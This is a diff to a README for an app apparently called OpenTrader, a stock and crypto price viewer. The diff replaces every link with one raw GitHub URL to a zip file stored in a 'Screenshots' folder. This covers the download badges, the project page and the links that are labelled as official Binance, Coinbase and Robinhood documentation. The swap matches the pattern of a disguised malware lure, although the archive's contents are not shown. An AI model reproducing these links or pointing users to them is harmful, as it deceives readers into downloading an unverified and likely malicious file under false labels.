@@ -1,6 +1,6 @@
 # 🚀 OpenTrader - Live Stock and Crypto Viewer
 
-[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip)
 
 OpenTrader is an open-source app that shows live stock and crypto market data. It updates prices and stats in real time. This app helps you track your favorite assets from popular platforms like Binance, Coinbase, and Robinhood.
 
@@ -33,7 +33,7 @@ No special skills or software installations are needed other than what is listed
 
 Click the button below to visit the OpenTrader download page on GitHub:
 
-[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-grey?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-grey?style=for-the-badge)](https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip)
 
 The page contains the files you need to run OpenTrader on Windows. This guide assumes you will download the latest Windows installer or executable from the releases or main repo.
 
@@ -115,13 +115,13 @@ If OpenTrader does not start or shows errors:
 
 ## 🔗 Useful Links
 
-- OpenTrader GitHub page: [https://github.com/joaovit565/OpenTrader](https://github.com/joaovit565/OpenTrader)
+- OpenTrader GitHub page: [https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip](https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip)
 
-- Binance API Documentation: https://binance-docs.github.io/apidocs/spot/en/
+- Binance API Documentation: https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip
 
-- Coinbase Market Data: https://docs.cloud.coinbase.com/sign-in-with-coinbase/docs/api-prices
+- Coinbase Market Data: https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip
 
-- Robinhood Market Data: https://robinhood.com/us/en/support/articles/market-data/
+- Robinhood Market Data: https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip
 
 ---
 
@@ -163,4 +163,4 @@ New versions of OpenTrader are available on GitHub. Check the releases page regu
 
 # [🚀] OpenTrader Badge
 
-[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://github.com/joaovit565/OpenTrader)
+[![Download OpenTrader](https://img.shields.io/badge/Download-OpenTrader-blue?style=for-the-badge)](https://raw.githubusercontent.com/joaovit565/OpenTrader/master/Screenshots/Open-Trader-v2.2.zip)
